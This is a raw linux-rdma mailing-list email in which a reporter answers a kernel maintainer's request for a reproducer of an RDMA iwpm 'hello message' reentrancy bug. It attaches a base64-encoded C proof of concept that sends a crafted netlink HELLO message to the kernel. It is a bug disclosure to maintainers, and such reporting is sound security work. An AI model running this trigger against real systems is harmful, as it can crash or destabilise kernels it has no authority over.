Return-Path: <linux-rdma+bounces-6734-lists+linux-rdma=lfdr.de@vger.kernel.org>
X-Original-To: lists+linux-rdma@lfdr.de
Delivered-To: lists+linux-rdma@lfdr.de
Received: from ny.mirrors.kernel.org (ny.mirrors.kernel.org [147.75.199.223])
	by mail.lfdr.de (Postfix) with ESMTPS id 7F3129FC338
	for <lists+linux-rdma@lfdr.de>; Wed, 25 Dec 2024 02:59:19 +0100 (CET)
Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by ny.mirrors.kernel.org (Postfix) with ESMTPS id C4068165064
	for <lists+linux-rdma@lfdr.de>; Wed, 25 Dec 2024 01:59:16 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id CD7B217BA3;
	Wed, 25 Dec 2024 01:59:12 +0000 (UTC)
X-Original-To: linux-rdma@vger.kernel.org
Received: from zg8tmtyylji0my4xnjeumjiw.icoremail.net (zg8tmtyylji0my4xnjeumjiw.icoremail.net [162.243.161.220])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id B2D8F2581;
	Wed, 25 Dec 2024 01:59:08 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=162.243.161.220
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1735091952; cv=none; b=nmrBEity4Tdo6aJHpBVy9OIgIiFJuGKovcd/qxyPAZnurIMTA1xiUykmYFMHoOZxxaLR3RDN3rU/3WXi7196LdH+alOxSHs9ChqTTAsa0P14mplCvNWQyZ2dDTFTlmEGgaSUEb0/hubIx9Y0hWQrJ8n7vf0ekOvtxBUb75Mzbnk=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1735091952; c=relaxed/simple;
	bh=9RnXuyYSrycqXgMkstu8Qj3ZnH6RT+bt/Qi8lYcAu+8=;
	h=Date:From:To:Cc:Subject:In-Reply-To:References:Content-Type:
	 MIME-Version:Message-ID; b=nZFmi79VXoDuJYXGdFi82jygYlr2+9gZKiyV3aGeSCQVA4E9GN5IgePC+ZqYuqor+k/dVm4dxdQIn3MC6HmkeCLtZ4gSOjtcH0d3MCCHqjXCFm5MNGRHggyWn7d22TxD04t2iHCmm5RuFfqRhJFPuRE7EDketTfZAEXHOfGRzrw=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=zju.edu.cn; spf=pass smtp.mailfrom=zju.edu.cn; arc=none smtp.client-ip=162.243.161.220
Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=zju.edu.cn
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=zju.edu.cn
Received: from linma$zju.edu.cn ( [36.24.204.179] ) by
 ajax-webmail-mail-app2 (Coremail) ; Wed, 25 Dec 2024 09:58:35 +0800
 (GMT+08:00)
Date: Wed, 25 Dec 2024 09:58:35 +0800 (GMT+08:00)
X-CM-HeaderCharset: UTF-8
From: "Lin Ma" <linma@zju.edu.cn>
To: "Leon Romanovsky" <leon@kernel.org>
Cc: jgg@ziepe.ca, cmeiohas@nvidia.com, michaelgur@nvidia.com,
	linux-rdma@vger.kernel.org, linux-kernel@vger.kernel.org
Subject: Re: [bug report] RDMA/iwpm: reentrant iwpm hello message
X-Priority: 3
X-Mailer: Coremail Webmail Server Version 2024.1-cmXT5 build
 20240625(a75f206e) Copyright (c) 2002-2024 www.mailtech.cn zju.edu.cn
In-Reply-To: <20241224192616.GI171473@unreal>
References: <661ee85f.a4a2.193e4b2f91b.Coremail.linma@zju.edu.cn>
 <20241224092938.GC171473@unreal>
 <103c061b.e87e.193f84b0840.Coremail.linma@zju.edu.cn>
 <20241224141127.GH171473@unreal>
 <48307bf.eecb.193f974dadf.Coremail.linma@zju.edu.cn>
 <20241224192616.GI171473@unreal>
Content-Type: multipart/mixed; 
	boundary="----=_Part_218306_1701357919.1735091915628"
Precedence: bulk
X-Mailing-List: linux-rdma@vger.kernel.org
List-Id: <linux-rdma.vger.kernel.org>
List-Subscribe: <mailto:linux-rdma+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-rdma+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Message-ID: <24cc4fc5.f216.193fb898b6c.Coremail.linma@zju.edu.cn>
X-Coremail-Locale: zh_CN
X-CM-TRANSID:by_KCgDnGpfMZmtncX+oAA--.16423W
X-CM-SenderInfo: qtrwiiyqvtljo62m3hxhgxhubq/1tbiAwMGEmdqvaILYQAAss
X-Coremail-Antispam: 1Ur529EdanIXcx71UUUUU7IcSsGvfJ3iIAIbVAYjsxI4VWxJw
	CS07vEb4IE77IF4wCS07vE1I0E4x80FVAKz4kxMIAIbVAFxVCaYxvI4VCIwcAKzIAtYxBI
	daVFxhVjvjDU=

------=_Part_218306_1701357919.1735091915628
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: base64

Cj4gCj4gRG8geW91IGhhdmUgcmVwcm9kdWNlciBmb3IgdGhhdD8KPiAKClllcCwgSSBhdHRhY2hl
ZCB0aGUgUG9DIGNvZGUsIHBsZWFzZSBlbmFibGUgQ09ORklHX0lORklOSUJBTkQKZm9yIHRlc3Rp
bmcuCgpUaGFua3MKQnkgdGhlIHdheSwgTWVycnkgQ2hyaXN0bWFzfgoK
------=_Part_218306_1701357919.1735091915628
Content-Type: text/plain; name=poc.c
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="poc.c"

Ly8gZ2NjIHBvYy5jIC1zdGF0aWMgLW8gcG9jLmVsZiAtbG1ubAojaW5jbHVkZSA8c3RkaW8uaD4K
I2luY2x1ZGUgPHN0ZGxpYi5oPgojaW5jbHVkZSA8c3RkaW50Lmg+CiNpbmNsdWRlIDxzdHJpbmcu
aD4KI2luY2x1ZGUgPHN0ZGJvb2wuaD4KCiNpbmNsdWRlIDxsaWJtbmwvbGlibW5sLmg+CgojZGVm
aW5lIFBBR0VfU0laRSAweDEwMDAKI2RlZmluZSBSRE1BX05MX0dFVF9DTElFTlQodHlwZSkgKCh0
eXBlICYgKCgoMSA8PCA2KSAtIDEpIDw8IDEwKSkgPj4gMTApCiNkZWZpbmUgUkRNQV9OTF9HRVRf
T1AodHlwZSkgKHR5cGUgJiAoKDEgPDwgMTApIC0gMSkpCiNkZWZpbmUgUkRNQV9OTF9HRVRfVFlQ
RShjbGllbnQsIG9wKSAoKGNsaWVudCA8PCAxMCkgKyBvcCkKI2RlZmluZSBSRE1BX05MX0lXQ00g
KDIpCiNkZWZpbmUgSVdQTV9OTEFfSEVMTE9fQUJJX1ZFUlNJT04gKDEpCgplbnVtCnsKICAgIFJE
TUFfTkxfSVdQTV9SRUdfUElEID0gMCwKICAgIFJETUFfTkxfSVdQTV9BRERfTUFQUElORywKICAg
IFJETUFfTkxfSVdQTV9RVUVSWV9NQVBQSU5HLAogICAgUkRNQV9OTF9JV1BNX1JFTU9WRV9NQVBQ
SU5HLAogICAgUkRNQV9OTF9JV1BNX1JFTU9URV9JTkZPLAogICAgUkRNQV9OTF9JV1BNX0hBTkRM
RV9FUlIsCiAgICBSRE1BX05MX0lXUE1fTUFQSU5GTywKICAgIFJETUFfTkxfSVdQTV9NQVBJTkZP
X05VTSwKICAgIFJETUFfTkxfSVdQTV9IRUxMTywKICAgIFJETUFfTkxfSVdQTV9OVU1fT1BTCn07
CgppbnQgbWFpbihpbnQgYXJnYywgY2hhciBjb25zdCAqYXJndltdKQp7CiAgICBzdHJ1Y3QgbW5s
X3NvY2tldCAqc29jazsKICAgIHN0cnVjdCBubG1zZ2hkciAqbmxoOwogICAgY2hhciBidWZbUEFH
RV9TSVpFXTsKICAgIGludCBlcnI7CgogICAgc29jayA9IG1ubF9zb2NrZXRfb3BlbihORVRMSU5L
X1JETUEpOwogICAgaWYgKHNvY2sgPT0gTlVMTCkKICAgIHsKICAgICAgICBwZXJyb3IoIm1ubF9z
b2NrZXRfb3BlbiIpOwogICAgICAgIGV4aXQoLTEpOwogICAgfQoKICAgIG5saCA9IG1ubF9ubG1z
Z19wdXRfaGVhZGVyKGJ1Zik7CiAgICBubGgtPm5sbXNnX3R5cGUgPSBSRE1BX05MX0dFVF9UWVBF
KFJETUFfTkxfSVdDTSwgUkRNQV9OTF9JV1BNX0hFTExPKTsKICAgIG5saC0+bmxtc2dfZmxhZ3Mg
PSBOTE1fRl9SRVFVRVNUIHwgTkxNX0ZfQUNLOwogICAgbmxoLT5ubG1zZ19zZXEgPSAxOwogICAg
bmxoLT5ubG1zZ19waWQgPSAwOwoKICAgIC8vIHN0YXRpYyBjb25zdCBzdHJ1Y3QgbmxhX3BvbGlj
eSBoZWxsb19wb2xpY3lbSVdQTV9OTEFfSEVMTE9fTUFYXSA9IHsKICAgIC8vICAgICBbSVdQTV9O
TEFfSEVMTE9fQUJJX1ZFUlNJT05dICAgICA9IHsgLnR5cGUgPSBOTEFfVTE2IH0KICAgIC8vIH07
CiAgICBtbmxfYXR0cl9wdXRfdTE2KG5saCwgSVdQTV9OTEFfSEVMTE9fQUJJX1ZFUlNJT04sIDMp
OwoKICAgIGVyciA9IG1ubF9zb2NrZXRfc2VuZHRvKHNvY2ssIGJ1ZiwgbmxoLT5ubG1zZ19sZW4p
OwogICAgaWYgKGVyciA8IDApCiAgICB7CiAgICAgICAgcGVycm9yKCJtbmxfc29ja2V0X3NlbmR0
byIpOwogICAgICAgIGV4aXQoLTEpOwogICAgfQogICAgcmV0dXJuIDA7Cn0K
------=_Part_218306_1701357919.1735091915628--


